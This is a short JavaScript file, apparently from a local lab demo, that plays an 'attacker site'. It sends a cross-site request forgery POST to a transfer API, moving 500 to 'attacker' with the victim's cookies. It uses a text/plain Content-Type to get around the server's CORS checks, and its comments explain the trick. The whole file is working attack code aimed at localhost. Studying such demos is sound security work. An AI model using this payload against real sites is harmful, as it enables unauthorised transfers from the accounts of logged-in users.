console.log("This is the attacker site");

fetch(
    "http://localhost:8000/api/transfer",
    {
        method: "POST",
        // CORS mode
        mode: "cors",
        // Must be set to "include" or "same-origin" to send OR receive cookies
        credentials: "include",
        headers: {
            // Below is what is expected, but by changing it to text/plain CORS is ignored server-side.
            //'Content-Type': 'application/json',
            'Content-Type': 'text/plain',
        },
        body: JSON.stringify({
            to_user: "attacker",
            amount: 500
        })
    }
).then(
    response => {
        console.log(response);
    }
)
